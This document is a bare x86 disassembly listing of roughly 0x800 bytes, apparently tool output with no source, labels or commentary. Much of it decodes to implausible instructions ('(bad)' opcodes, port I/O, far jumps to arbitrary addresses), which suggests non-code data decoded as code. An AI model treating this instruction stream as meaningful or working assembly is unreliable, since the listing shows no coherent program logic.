  401fff:	add    BYTE PTR [edi-0x467ff151],bh
  402005:	in     eax,0xa
  402007:	add    BYTE PTR [edi-0x6ffff51b],cl
  40200d:	push   ebx
  40200e:	pop    ebx
  40200f:	add    al,0x90
  402011:	lods   eax,DWORD PTR ds:[esi]
  402012:	pop    ecx
  402013:	add    al,0x0
  402015:	add    BYTE PTR [eax],al
  402017:	add    BYTE PTR [eax],al
  402019:	nop
  40201a:	lods   eax,DWORD PTR ds:[esi]
  40201b:	pop    ecx
  40201c:	add    al,0x90
  40201e:	mov    ebx,DWORD PTR [ecx+0x4]
  402021:	nop
  402022:	jg     0x40207d
  402024:	add    al,0x90
  402026:	cmc    
  402027:	pop    ecx
  402028:	add    al,0x90
  40202a:	xor    DWORD PTR [eax+0x4],ebx
  40202d:	nop
  40202e:	retf   
  40202f:	pop    eax
  402030:	add    al,0x90
  402032:	(bad)  
  402033:	pop    eax
  402034:	add    al,0x90
  402036:	jecxz  0x402091
  402038:	add    al,0x90
  40203a:	in     eax,0x59
  40203c:	add    al,0x90
  40203e:	jmp    0x9dd0249c
  402043:	pop    ecx
  402044:	add    al,0x90
  402046:	cmp    DWORD PTR [eax+0x4],ebx
  402049:	nop
  40204a:	mov    ch,0x59
  40204c:	add    al,0x90
  40204e:	push   ebx
  40204f:	pop    eax
  402050:	add    al,0x90
  402052:	pop    ss
  402053:	pop    ecx
  402054:	add    al,0x90
  402056:	or     ebx,DWORD PTR [ecx+0x4]
  402059:	nop
  40205a:	sbb    DWORD PTR [ecx+0x4],ebx
  40205d:	nop
  40205e:	pop    es
  40205f:	pop    ecx
  402060:	add    al,0x90
  402062:	cmc    
  402063:	pop    ecx
  402064:	add    al,0x90
  402066:	in     eax,dx
  402067:	pop    ecx
  402068:	add    al,0x90
  40206a:	xchg   ebp,eax
  40206b:	pop    ecx
  40206c:	add    al,0x90
  40206e:	dec    ecx
  40206f:	or     eax,0x5bd99000
  402074:	add    al,0x90
  402076:	mov    ebx,DWORD PTR [ebx+0x4]
  402079:	nop
  40207a:	mov    ebx,DWORD PTR [ebx+0x4]
  40207d:	add    BYTE PTR [eax],al
  40207f:	add    BYTE PTR [eax],al
  402081:	add    BYTE PTR [eax-0x6ffba43b],dl
  402087:	dec    ecx
  402088:	or     eax,0x334f9000
  40208d:	add    al,0x90
  40208f:	mov    dl,0x2b
  402091:	ds xchg esp,eax
  402093:	mov    dl,0x1
  402095:	mov    WORD PTR ds:[edx-0x4d6bc1c7],?
  40209c:	sub    eax,0x4db28c3e
  4020a1:	ds xchg esp,eax
  4020a3:	mov    dl,0x49
  4020a5:	mov    WORD PTR ds:[edx-0x4d6bc1a5],?
  4020ac:	outs   dx,DWORD PTR ds:[esi]
  4020ad:	mov    WORD PTR ds:[edx-0x4d6bc6af],?
  4020b4:	inc    ebp
  4020b5:	cmp    DWORD PTR [edx+esi*4-0x4d6bc6e3],ecx
  4020bc:	or     eax,0xefb28c39
  4020c1:	cmp    BYTE PTR [edx+esi*4-0x4d73c715],dl
  4020c8:	pop    ebp
  4020c9:	cmp    dl,BYTE PTR [edx+esi*4-0x4d73c573]
  4020d0:	mov    ds:0xb3b2943a,eax
  4020d5:	cmp    cl,BYTE PTR [edx+esi*4-0x4d6bc56b]
  4020dc:	sar    DWORD PTR [edx],cl
  4020de:	mov    WORD PTR [edx-0x4d6bc517],?
  4020e4:	mov    ch,0x3a
  4020e6:	add    BYTE PTR [eax],al
  4020e8:	add    BYTE PTR [eax],al
  4020ea:	add    BYTE PTR [edx+esi*4-0x4d6bc4db],cl
  4020f1:	jne    0x40212e
  4020f3:	mov    WORD PTR [edx-0x4d6bc5f7],?
  4020f9:	fistp  QWORD PTR [edx]
  4020fb:	mov    WORD PTR [edx-0x4d6bc52f],?
  402101:	imul   edi,DWORD PTR [ebx],0xffffff8c
  402104:	mov    dl,0x55
  402106:	cmp    edx,DWORD PTR [edx+esi*4-0x4d73c4af]
  40210d:	push   cs
  40210e:	sbb    DWORD PTR [ebx-0x52],0xae5b710e
  402115:	push   cs
  402116:	xor    ebx,ecx
  402118:	scas   al,BYTE PTR es:[edi]
  402119:	push   cs
  40211a:	jns    0x4020f9
  40211c:	scas   al,BYTE PTR es:[edi]
  40211d:	push   cs
  40211e:	ins    DWORD PTR es:[edi],dx
  40211f:	in     eax,0xae
  402121:	push   cs
  402122:	xchg   ebp,eax
  402123:	fsubr  QWORD PTR [esi-0x5154f4f2]
  402129:	push   cs
  40212a:	xchg   edi,eax
  40212b:	mov    esp,0xc4a30eae
  402130:	scas   al,BYTE PTR es:[edi]
  402131:	push   cs
  402132:	mov    cl,0xbc
  402134:	scas   al,BYTE PTR es:[edi]
  402135:	push   cs
  402136:	adc    ebp,esp
  402138:	scas   al,BYTE PTR es:[edi]
  402139:	push   cs
  40213a:	in     eax,dx
  40213b:	fsubr  QWORD PTR [esi-0x511c2ef2]
  402141:	push   cs
  402142:	mov    ebp,0xa70eaee3
  402147:	ret    
  402148:	scas   al,BYTE PTR es:[edi]
  402149:	push   cs
  40214a:	cdq    
  40214b:	ret    
  40214c:	scas   al,BYTE PTR es:[edi]
  40214d:	push   cs
  40214e:	stos   DWORD PTR es:[edi],eax
  40214f:	add    BYTE PTR [eax],al
  402151:	add    BYTE PTR [eax],al
  402153:	add    bl,al
  402155:	scas   al,BYTE PTR es:[edi]
  402156:	push   cs
  402157:	jne    0x40211c
  402159:	scas   al,BYTE PTR es:[edi]
  40215a:	push   cs
  40215b:	dec    edi
  40215c:	arpl   WORD PTR [esi-0x519c88f2],bp
  402162:	push   cs
  402163:	(bad)  
  402164:	mov    ecx,0xba2b0eae
  402169:	scas   al,BYTE PTR es:[edi]
  40216a:	push   cs
  40216b:	and    eax,0xf90eaeaa
  402170:	test   eax,0x9b1d0eae
  402175:	scas   al,BYTE PTR es:[edi]
  402176:	push   cs
  402177:	jne    0x402118
  402179:	scas   al,BYTE PTR es:[edi]
  40217a:	push   cs
  40217b:	dec    ecx
  40217c:	xchg   DWORD PTR [esi-0x5180c4f2],ebp
  402182:	push   cs
  402183:	xchg   ebp,eax
  402184:	xchg   DWORD PTR [esi-0x51807ef2],ebp
  40218a:	push   cs
  40218b:	add    BYTE PTR [edi-0x7f],cl
  40218e:	or     al,BYTE PTR [eax]
  402190:	das    
  402191:	in     eax,0xa
  402193:	add    bh,bl
  402195:	in     al,0xa
  402197:	add    bh,cl
  402199:	in     al,0xa
  40219b:	add    BYTE PTR [ebp-0x1c],cl
  40219e:	or     al,BYTE PTR [eax]
  4021a0:	in     eax,dx
  4021a1:	jg     0x4021ad
  4021a3:	add    BYTE PTR [ecx],dl
  4021a5:	or     BYTE PTR [edx],0x0
  4021a8:	inc    ecx
  4021a9:	or     BYTE PTR [edx],0x0
  4021ac:	aas    
  4021ad:	or     BYTE PTR [edx],0x0
  4021b0:	and    eax,0x53000a80
  4021b5:	or     BYTE PTR [edx],0x0
  4021b8:	add    BYTE PTR [eax],al
  4021ba:	add    BYTE PTR [eax],al
  4021bc:	add    BYTE PTR [ecx-0x80],al
  4021bf:	or     al,BYTE PTR [eax]
  4021c1:	inc    ecx
  4021c2:	or     BYTE PTR [edx],0x0
  4021c5:	push   ebp
  4021c6:	jbe    0x4021d2
  4021c8:	add    BYTE PTR [ebx],al
  4021ca:	jbe    0x4021d6
  4021cc:	add    cl,dh
  4021ce:	jne    0x4021da
  4021d0:	add    BYTE PTR [ecx],dl
  4021d2:	jbe    0x4021de
  4021d4:	add    BYTE PTR [ebx],al
  4021d6:	jbe    0x4021e2
  4021d8:	add    cl,al
  4021da:	jne    0x4021e6
  4021dc:	add    BYTE PTR [ecx-0x48fff58b],bh
  4021e2:	jne    0x4021ee
  4021e4:	add    BYTE PTR [ebx-0x76fff58b],ch
  4021ea:	jne    0x4021f6
  4021ec:	add    BYTE PTR [ebp+0x2f000ade],ch
  4021f2:	in     al,0xa
  4021f4:	add    bl,al
  4021f6:	jecxz  0x402202
  4021f8:	add    bl,al
  4021fa:	jecxz  0x402206
  4021fc:	add    BYTE PTR [ebp+0x37000ae3],dh
  402202:	jns    0x40220e
  402204:	add    BYTE PTR [edi],ch
  402206:	jl     0x402212
  402208:	add    BYTE PTR [eax-0x6ffbcded],dl
  40220e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40220f:	xor    eax,DWORD PTR [eax+edx*4]
  402212:	mov    ds:0x5f900433,eax
  402217:	xor    al,BYTE PTR [eax+edx*4]
  40221a:	dec    ebx
  40221b:	xor    al,BYTE PTR [eax+edx*4]
  40221e:	jg     0x402250
  402220:	add    al,0x0
  402222:	add    BYTE PTR [eax],al
  402224:	add    BYTE PTR [eax],al
  402226:	nop
  402227:	mov    eax,ds:0x7f900430
  40222c:	aaa    
  40222d:	add    al,0x90
  40222f:	adc    edi,DWORD PTR [eax]
  402231:	add    al,0x90
  402233:	das    
  402234:	pop    esp
  402235:	add    al,0x90
  402237:	dec    ecx
  402238:	or     eax,0x46e19000
  40223d:	add    al,0x90
  40223f:	xlat   BYTE PTR ds:[ebx]
  402240:	inc    esi
  402241:	add    al,0x90
  402243:	leave  
  402244:	inc    esi
  402245:	add    al,0x90
  402247:	dec    ecx
  402248:	or     eax,0x437b9000
  40224d:	add    al,0x90
  40224f:	popf   
  402250:	inc    ebx
  402251:	add    al,0x90
  402253:	xor    eax,0x51900442
  402258:	inc    edx
  402259:	add    al,0x90
  40225b:	test   DWORD PTR [edx+0x4],0x4437390
  402262:	nop
  402263:	sbb    eax,0x9900443
  402268:	inc    ebx
  402269:	add    al,0x90
  40226b:	in     eax,0x43
  40226d:	add    al,0x90
  40226f:	ret    
  402270:	inc    ebx
  402271:	add    al,0x90
  402273:	iret   
  402274:	inc    ebx
  402275:	add    al,0x90
  402277:	dec    ecx
  402278:	or     eax,0x45019000
  40227d:	add    al,0x90
  40227f:	pop    ebx
  402280:	or     eax,0xd5f1000
  402285:	add    BYTE PTR [eax],dl
  402287:	mov    dl,0xd3
  402289:	add    eax,DWORD PTR [eax]
  40228b:	add    BYTE PTR [eax],al
  40228d:	add    BYTE PTR [eax],al
  40228f:	nop
  402290:	xor    dh,bh
  402292:	add    edx,DWORD PTR [eax-0x6ffc1ace]
  402298:	xor    bh,al
  40229a:	add    edx,DWORD PTR [eax-0x73b470ce]
  4022a0:	mov    dl,0xb4
  4022a2:	add    edx,DWORD PTR [eax-0x73b596ce]
  4022a8:	mov    dl,0x65
  4022aa:	dec    edx
  4022ab:	xchg   esp,eax
  4022ac:	mov    dl,0x9b
  4022ae:	dec    edx
  4022af:	mov    WORD PTR [edx-0x4d6bb545],?
  4022b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022b6:	dec    edx
  4022b7:	mov    WORD PTR [edx+0x329003fa],?
  4022bd:	mov    bh,0x4a
  4022bf:	mov    WORD PTR [edx+0x329003e8],?
  4022c5:	fisttp QWORD PTR [edx-0x74]
  4022c8:	mov    dl,0xeb
  4022ca:	dec    edx
  4022cb:	xchg   esp,eax
  4022cc:	mov    dl,0xed
  4022ce:	dec    esp
  4022cf:	mov    WORD PTR [edx-0x4d6bb329],?
  4022d5:	in     al,0x3
  4022d7:	nop
  4022d8:	xor    dh,ah
  4022da:	add    edx,DWORD PTR [eax-0x6ffc05ce]
  4022e0:	xor    ah,dh
  4022e2:	add    edx,DWORD PTR [eax-0x6ffbb7ce]
  4022e8:	xor    dh,BYTE PTR [edi]
  4022ea:	add    al,0x90
  4022ec:	xor    ah,dl
  4022ee:	add    edx,DWORD PTR [eax+0x3fb32]
  4022f4:	add    BYTE PTR [eax],al
  4022f6:	add    BYTE PTR [eax],al
  4022f8:	nop
  4022f9:	xor    ah,cl
  4022fb:	add    edx,DWORD PTR [eax-0x6ffc09ce]
  402301:	xor    dl,BYTE PTR [ecx-0x144d73b4]
  402307:	add    edx,DWORD PTR [eax-0x6c16f1ce]
  40230d:	mov    dl,0xe
  40230f:	lods   eax,DWORD PTR ds:[esi]
  402310:	pop    eax
  402311:	scas   al,BYTE PTR es:[edi]
  402312:	push   cs
  402313:	push   ebp
  402314:	pop    ebx
  402315:	scas   al,BYTE PTR es:[edi]
  402316:	push   cs
  402317:	push   edi
  402318:	dec    ebx
  402319:	scas   al,BYTE PTR es:[edi]
  40231a:	push   cs
  40231b:	jmp    0xe34ed16f
  402320:	push   edi
  402321:	scas   al,BYTE PTR es:[edi]
  402322:	push   cs
  402323:	fisttp QWORD PTR [edi-0x52]
  402326:	push   cs
  402327:	or     DWORD PTR [eax-0x52],ecx
  40232a:	push   cs
  40232b:	add    ecx,DWORD PTR [eax-0x52]
  40232e:	push   cs
  40232f:	cmc    
  402330:	xlat   BYTE PTR ds:[ebx]
  402331:	scas   al,BYTE PTR es:[edi]
  402332:	push   cs
  402333:	out    0xcf,eax
  402335:	scas   al,BYTE PTR es:[edi]
  402336:	push   cs
  402337:	mov    cl,0xd7
  402339:	scas   al,BYTE PTR es:[edi]
  40233a:	push   cs
  40233b:	mov    ebx,0x890eaecf
  402340:	xlat   BYTE PTR ds:[ebx]
  402341:	scas   al,BYTE PTR es:[edi]
  402342:	push   cs
  402343:	xchg   edi,eax
  402344:	iret   
  402345:	scas   al,BYTE PTR es:[edi]
  402346:	push   cs
  402347:	jmp    0x274ed5df
  40234c:	enter  0xeae,0x63
  402350:	aam    0xae
  402352:	push   cs
  402353:	(bad)  
  402354:	shr    DWORD PTR [esi-0x512b9ef2],cl
  40235a:	push   cs
  40235b:	jmp    0x402360
  402360:	add    BYTE PTR [ebx-0x20d2f14e],dl
  402366:	scas   al,BYTE PTR es:[edi]
  402367:	push   cs
  402368:	sub    eax,0x4f0eaed7
  40236d:	iret   
  40236e:	scas   al,BYTE PTR es:[edi]
  40236f:	push   cs
  402370:	sti    
  402371:	(bad)  
  402372:	scas   al,BYTE PTR es:[edi]
  402373:	push   cs
  402374:	iret   
  402375:	pop    esi
  402376:	scas   al,BYTE PTR es:[edi]
  402377:	push   cs
  402378:	not    DWORD PTR [esi-0x52]
  40237b:	push   cs
  40237c:	imul   ecx,DWORD PTR [esi-0x52],0xe
  402380:	jae    0x4023c8
  402382:	scas   al,BYTE PTR es:[edi]
  402383:	push   cs
  402384:	cmp    eax,0xeae5e
  402389:	stc    
  40238a:	mov    al,0xe
  40238c:	add    cl,ch
  40238e:	mov    al,0xe
  402390:	add    ch,ah
  402392:	inc    esp
  402393:	test   ebx,esi
  402395:	jp     0x402342
  402397:	cld    
  402398:	inc    edx
  402399:	dec    edx
  40239a:	mov    dl,0x69
  40239c:	faddp  st(2),st
  40239e:	cwde   
  40239f:	repnz and eax,DWORD PTR [edx+0x403eb832]
  4023a6:	sar    al,cl
  4023a8:	dec    esp
  4023a9:	sbb    DWORD PTR [ebx-0x3d2b1013],ecx
  4023af:	xchg   ecx,eax
  4023b0:	cmp    eax,0x5e62322e
  4023b5:	fwait
  4023b6:	cmp    al,0x51
  4023b8:	inc    edi
  4023b9:	adc    ecx,DWORD PTR [esi-0x1c]
  4023bc:	xor    eax,DWORD PTR [esi+0x16737f06]
  4023c2:	jle    0x402393
  4023c4:	sbb    al,BYTE PTR [eax]
  4023c6:	add    BYTE PTR [eax],al
  4023c8:	add    BYTE PTR [eax],al
  4023ca:	xchg   esi,eax
  4023cb:	mov    cl,0x53
  4023cd:	dec    esi
  4023ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023cf:	jae    0x4023f1
  4023d1:	mov    cl,0xcf
  4023d3:	ficom  WORD PTR [esi+0x2e0ec5b7]
  4023d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023da:	mov    ecx,0xec4ff8a4
  4023df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023e0:	sbb    BYTE PTR [ebx+0x6a],dh
  4023e3:	repz mov al,ds:0x3d0da816
  4023e9:	sub    DWORD PTR [edi-0x54ee2337],eax
  4023ef:	cmp    al,0xf1
  4023f1:	mov    edi,0x6030266e
  4023f6:	sbb    edi,DWORD PTR [edi-0xc570af7]
  4023fc:	fcom   QWORD PTR [ecx]
  4023fe:	add    BYTE PTR [edi],0xe
  402401:	add    BYTE PTR [ecx],dh
  402403:	scas   al,BYTE PTR es:[edi]
  402404:	in     al,dx
  402405:	and    DWORD PTR [eax-0x46cc544a],edx
  40240b:	pop    ebx
  40240c:	data16 rol BYTE PTR [ecx+0x1ffff877],cl
  402413:	test   DWORD PTR [edx+0x27e9703e],eax
  402419:	dec    eax
  40241a:	mov    al,0xc4
  40241c:	xor    ebx,DWORD PTR [ebp+edx*2+0x5177c023]
  402423:	jns    0x4023e2
  402425:	xchg   ebp,eax
  402426:	mov    edi,0xa78974d6
  40242b:	lea    esi,[edx+esi*1+0x0]
  402432:	add    BYTE PTR [esi+0x27],cl
  402435:	(bad)  
  402436:	ficom  DWORD PTR [esi-0x5de5e212]
  40243c:	xor    DWORD PTR [ecx],0xffffffa5
  40243f:	pushf  
  402440:	mov    dh,0x23
  402442:	ins    BYTE PTR es:[edi],dx
  402443:	fcmove st,st(4)
  402445:	pushf  
  402446:	lahf   
  402447:	push   es
  402448:	cmp    dh,bl
  40244a:	jge    0x4024c9
  40244c:	pop    es
  40244d:	aam    0x4c
  40244f:	mov    al,ds:0xd0d85b62
  402454:	aad    0x24
  402456:	mov    ecx,0x9bf68d83
  40245b:	cmp    al,0xe1
  40245d:	sub    DWORD PTR [ebp-0x3],edx
  402460:	jns    0x40242a
  402462:	dec    edx
  402463:	iret   
  402464:	mov    ebx,0xa98cfc02
  402469:	popa   
  40246a:	mov    bh,0x78
  40246c:	(bad)  
  40246d:	adc    ebp,ebx
  40246f:	mov    al,ds:0xcee84926
  402474:	sub    edi,ebp
  402476:	and    esp,esi
  402478:	mov    bh,0x33
  40247a:	sub    BYTE PTR [edi],al
  40247c:	xor    BYTE PTR [ebp-0x652e7e9b],dh
  402482:	mov    ebp,0xe661b252
  402487:	arpl   WORD PTR [edx-0x4fa5e4a5],sp
  40248d:	jge    0x4024b6
  40248f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402490:	jmp    0xa10177a1
  402495:	pop    ecx
  402496:	popf   
  402497:	add    BYTE PTR [eax],al
  402499:	add    BYTE PTR [eax],al
  40249b:	add    BYTE PTR [eax+0x8ae2072],dl
  4024a1:	xchg   edx,eax
  4024a2:	out    0x6b,al
  4024a4:	adc    eax,0xd77066b6
  4024a9:	mov    al,ds:0x890367f
  4024ae:	out    0x38,eax
  4024b0:	data16 mov fs,WORD PTR [edi-0x63]
  4024b4:	adc    BYTE PTR [esi-0x40],0x70
  4024b8:	xlat   BYTE PTR ds:[ebx]
  4024b9:	mov    al,ds:0x890367f
  4024be:	out    0x38,eax
  4024c0:	data16 mov gs,WORD PTR [edi-0x3f]
  4024c4:	xchg   ebp,eax
  4024c5:	fnstenv [ecx+0x6a]
  4024c8:	(bad)  
  4024c9:	les    edx,FWORD PTR [ebx+edi*1-0x70]
  4024cd:	ret    0x4cd
  4024d0:	adc    DWORD PTR [edx-0x30955695],ebp
  4024d6:	les    ecx,FWORD PTR [esi]
  4024d8:	inc    ecx
  4024d9:	les    ebx,FWORD PTR [edx+0x6a]
  4024dc:	nop
  4024dd:	repnz lahf 
  4024df:	retf   
  4024e0:	push   ebp
  4024e1:	xor    bh,cl
  4024e3:	mov    WORD PTR [ecx-0x4f],ss
  4024e6:	jmp    0x9074:0x9ac46173
  4024ed:	repnz pop ds
  4024ef:	mov    esp,0x207e3235
  4024f4:	gs jnp 0x402543
  4024f7:	xor    eax,0xaa99c441
  4024fc:	nop
  4024fd:	repnz pop ds
  4024ff:	call   0x800:0x0
  402506:	ror    DWORD PTR [esi],cl
  402508:	outs   dx,DWORD PTR ds:[esi]
  402509:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40250a:	xchg   edi,eax
  40250b:	xchg   esp,eax
  40250c:	push   ds
  40250d:	or     eax,DWORD PTR [edi+ebx*1]
  402510:	pop    esp
  402511:	fnsave [edx-0xfa3cde2]
  402517:	repz je 0x4024c3
  40251a:	into   
  40251b:	sbb    DWORD PTR [ecx+0x4e456618],0x19
  402522:	mov    DWORD PTR [ecx-0x57b269d6],ebp
  402528:	daa    
  402529:	dec    ebx
  40252a:	popa   
  40252b:	arpl   WORD PTR [esi-0x68e0fb7f],si
  402531:	int    0xb2
  402533:	into   
  402534:	scas   al,BYTE PTR es:[edi]
  402535:	sbb    DWORD PTR [ebx],edi
  402537:	cs xchg esp,eax
  402539:	mov    ch,0x39
  40253b:	in     eax,0x1a
  40253d:	jle    0x402543
  40253f:	pop    ds
  402540:	xchg   edi,eax
  402541:	int    0xb2
  402543:	into   
  402544:	scas   al,BYTE PTR es:[edi]
  402545:	stc    
  402546:	cmp    ch,BYTE PTR [esi]
  402548:	xor    BYTE PTR [ecx+0x48d4b965],dl
  40254e:	add    eax,0xb290481f
  402553:	push   ds
  402554:	ret    
  402555:	xchg   edx,eax
  402556:	adc    DWORD PTR [ebx+ebx*1-0x6],0xffffffc7
  40255b:	leave  
  40255c:	out    dx,eax
  40255d:	test   eax,0xb541f03
  402562:	mov    dl,0xce
  402564:	scas   al,BYTE PTR es:[edi]
  402565:	sbb    ebp,DWORD PTR [edi]
  402567:	icebp  
  402568:	sahf   
  402569:	add    BYTE PTR [eax],al
  40256b:	add    BYTE PTR [eax],al
  40256d:	add    dl,cl
  40256f:	popa   
  402570:	arpl   WORD PTR [esi-0x68e0fb7f],si
  402576:	dec    esp
  402577:	mov    dl,0xce
  402579:	sbb    bh,BYTE PTR cs:[edx]
  40257c:	cs push 0x4ed2c3f9
  402582:	mov    edi,0xa1001f01
  402587:	or     BYTE PTR [esi],0xaa
  40258a:	sub    DWORD PTR [eax-0x38c1dbe0],eax
  402590:	nop
  402591:	les    esi,FWORD PTR [edx+0x51]
  402594:	fcom   QWORD PTR [ecx]
  402596:	ins    BYTE PTR es:[edi],dx
  402597:	imul   ecx,DWORD PTR [esi],0x8db55310
  40259d:	add    al,0xc3
  40259f:	cmp    al,0xb1
  4025a1:	mov    edi,0x11dcff1e
  4025a6:	dec    eax
  4025a7:	xor    cl,dh
  4025a9:	btr    DWORD PTR [ebp+0x5acd5a5f],esi
  4025b0:	mov    ds:0xde1d3544,al
  4025b5:	adc    DWORD PTR [ecx],ecx
  4025b7:	xchg   ecx,eax
  4025b8:	push   cs
  4025b9:	shl    dh,0x4a
  4025bc:	xchg   BYTE PTR [eax],ah
  4025be:	mov    ebp,0xc8317d31
  4025c3:	enter  0x4cfa,0x33
  4025c7:	xchg   ecx,eax
  4025c8:	pop    ecx
  4025c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025ca:	jecxz  0x4025e7
  4025cc:	pop    ss
  4025cd:	push   esi
  4025ce:	loope  0x402569
  4025d0:	inc    ebp
  4025d1:	add    BYTE PTR [bx+si],al
  4025d4:	add    BYTE PTR [eax],al
  4025d6:	add    bl,ch
  4025d8:	and    esi,ebx
  4025da:	adc    esp,esp
  4025dc:	xchg   BYTE PTR [esi],cl
  4025de:	shl    BYTE PTR [esi],0x6c
  4025e1:	repz call FWORD PTR [eax+0x4802777c]
  4025e8:	ins    DWORD PTR es:[edi],dx
  4025e9:	rcl    BYTE PTR [ecx],0xca
  4025ec:	in     al,dx
  4025ed:	push   cs
  4025ee:	add    BYTE PTR [ecx-0x4c],ch
  4025f1:	push   cs
  4025f2:	add    eax,esp
  4025f4:	outs   dx,DWORD PTR ds:[esi]
  4025f5:	pop    eax
  4025f6:	xchg   ebp,eax
  4025f7:	in     eax,0x35
  4025f9:	rcl    DWORD PTR [ecx],0xa
  4025fc:	xchg   ebp,eax
  4025fd:	push   cs
  4025fe:	stos   BYTE PTR es:[edi],al
  4025ff:	sub    esi,eax
  402601:	dec    esi
  402602:	(bad)  
  402603:	nop
  402604:	sub    dl,ch
  402606:	nop
  402607:	int    0xc3
  402609:	icebp  
  40260a:	iret   
  40260b:	and    DWORD PTR [edx+0x19ea000f],0x5fb42e42
  402615:	sbb    BYTE PTR [esi-0x2d516b34],bl
  40261b:	mov    eax,ds:0xa000b69e
  402620:	jae    0x402631
  402622:	adc    DWORD PTR [ecx+esi*8-0x3a642d4],0xfffffff7
  40262a:	rol    BYTE PTR [ecx-0x2fffaa7a],1
  402630:	loopne 0x4025e4
  402632:	std    
  402633:	iret   
  402634:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  402636:	lods   al,BYTE PTR ds:[esi]
  402637:	dec    esp
  402638:	popf   
  402639:	loop   0x40260b
  40263b:	add    BYTE PTR [eax],al
  40263d:	add    BYTE PTR [eax],al
  40263f:	add    BYTE PTR [ecx-0x2fff91c7],ah
  402645:	pusha  
  402646:	xchg   edi,eax
  402647:	mov    BYTE PTR [eax+0x45],dh
  40264a:	in     eax,dx
  40264b:	xchg   DWORD PTR [ebx-0x7e2de734],edi
  402651:	inc    edi
  402652:	lds    eax,FWORD PTR [eax]
  402654:	shl    BYTE PTR [eax-0x69],1
  402657:	mov    BYTE PTR [eax-0x26cad175],dh
  40265d:	hlt    
  40265e:	cmp    edx,ecx
  402660:	mov    eax,ds:0x5000a487
  402665:	pusha  
  402666:	xchg   edi,eax
  402667:	mov    BYTE PTR [eax+0x4412a4a0],dh
  40266d:	inc    eax
  40266e:	pop    edx
  40266f:	iret   
  402670:	and    DWORD PTR [ecx+0x192a0041],0xde742e42
  40267a:	int3   
  40267b:	pop    ecx
  40267c:	repz or esp,ebp
  40267f:	xor    al,0xc8
  402681:	mov    dl,0x7d
  402683:	sub    eax,0x58f2aefa
  402688:	lods   eax,DWORD PTR ds:[esi]
  402689:	test   al,0xdd
  40268b:	aas    
  40268c:	inc    ebx
  40268d:	pop    ss
  40268e:	ins    BYTE PTR es:[edi],dx
  40268f:	pop    ss
  402690:	mov    esi,0x6d27727a
  402695:	xlat   BYTE PTR ds:[ebx]
  402696:	or     bh,BYTE PTR [edx+0x3e6fc27]
  40269c:	nop
  40269d:	mov    dl,0xe7
  40269f:	add    edx,DWORD PTR [eax+0x7557b2]
  4026a5:	add    BYTE PTR [eax],al
  4026a7:	add    BYTE PTR [eax],al
  4026a9:	push   ebx
  4026aa:	mov    dl,0xeb
  4026ac:	add    edx,DWORD PTR [edx+esi*4-0x4d73fc11]
  4026b3:	daa    
  4026b4:	js     0x402709
  4026b6:	mov    dl,0xe3
  4026b8:	add    ecx,DWORD PTR [ebp-0x67fc284e]
  4026be:	mov    dl,0x27
  4026c0:	js     0x402715
  4026c2:	mov    dl,0xeb
  4026c4:	add    edx,DWORD PTR [esi+0x700407b2]
  4026ca:	mov    dl,0xa7
  4026cc:	ja     0x402721
  4026ce:	mov    dl,0xe3
  4026d0:	add    ecx,DWORD PTR [edx+esi*4-0x4d7ffc09]
  4026d7:	mov    bh,0x78
  4026d9:	push   ebx
  4026da:	mov    dl,0xff
  4026dc:	add    esp,DWORD PTR [eax-0x4ffbf84e]
  4026e2:	mov    dl,0xb7
  4026e4:	js     0x4026b9
  4026e6:	mov    dl,0xff
  4026e8:	add    esp,DWORD PTR [eax+0x100367b2]
  4026ee:	mov    bl,0x97
  4026f0:	js     0x4026c5
  4026f2:	mov    dl,0xef
  4026f4:	add    esi,DWORD PTR [eax-0x6ffc984e]
  4026fa:	mov    bl,0x77
  4026fc:	js     0x4026d1
  4026fe:	mov    dl,0xe
  402700:	leave  
  402701:	xchg   ebx,eax
  402702:	xor    cl,BYTE PTR [esi]
  402704:	jmp    0x402698
  402706:	mov    dl,0xa
  402708:	pop    ecx
  402709:	mov    edi,0x90e71
  40270e:	add    BYTE PTR [eax],al
  402710:	add    BYTE PTR [eax],al
  402712:	xchg   esp,eax
  402713:	mov    al,0xf
  402715:	jmp    0x4026a3
  402717:	mov    dl,0x1e
  402719:	pop    ecx
  40271a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40271b:	jno    0x40272b
  40271d:	jmp    0xe94ed9b5
  402722:	xchg   ebx,eax
  402723:	mov    dl,0xe
  402725:	dec    ecx
  402726:	(bad)  
  402727:	mov    dl,0xe
  402729:	jmp    0xe94ea9b9
  40272e:	mov    eax,edx
  402730:	push   cs
  402731:	cmc    
  402732:	fwait
  402733:	mov    eax,ds:0xcd8efb0e
  402738:	push   cs
  402739:	jmp    0xe94ec9c9
  40273e:	mov    esp,edx
  402740:	push   cs
  402741:	jmp    0xd94e19e2
  402746:	mov    ?,WORD PTR [eax-0x6d7416f2]
  40274c:	push   cs
  40274d:	jmp    0xe94ef9dd
  402752:	pushf  
  402753:	push   edx
  402754:	push   cs
  402755:	jmp    0xe94ed9f5
  40275a:	mov    esi,DWORD PTR [edx]
  40275c:	push   cs
  40275d:	jmp    0xe94e99ed
  402762:	pushf  
  402763:	adc    cl,BYTE PTR [esi]
  402765:	(bad)  [esi-0x7416f14c]
  40276b:	mov    cl,BYTE PTR [esi]
  40276d:	jmp    0xe94ef1fd
  402772:	pushf  
  402773:	inc    edx
  402774:	push   cs
  402775:	cli    
  402776:	add    BYTE PTR [eax],al
  402778:	add    BYTE PTR [eax],al
  40277a:	add    BYTE PTR [esi-0x7416f117],cl
  402780:	stos   BYTE PTR es:[edi],al
  402781:	push   cs
  402782:	add    BYTE PTR [ecx-0x47],ch
  402785:	add    BYTE PTR ss:[ecx],bh
  402788:	mov    esi,0xb46800de
  40278d:	pop    ds
  40278e:	add    BYTE PTR [ecx],ch
  402790:	mov    ecx,0xb9290066
  402795:	add    BYTE PTR es:[ecx],bh
  402798:	mov    esi,0xb93900be
  40279d:	push   es
  40279e:	add    BYTE PTR [ecx],ch
  4027a0:	mov    ecx,0xb9290086
  4027a5:	inc    esi
  4027a6:	add    cl,bh
  4027a8:	mov    ebp,0xb3e900fe
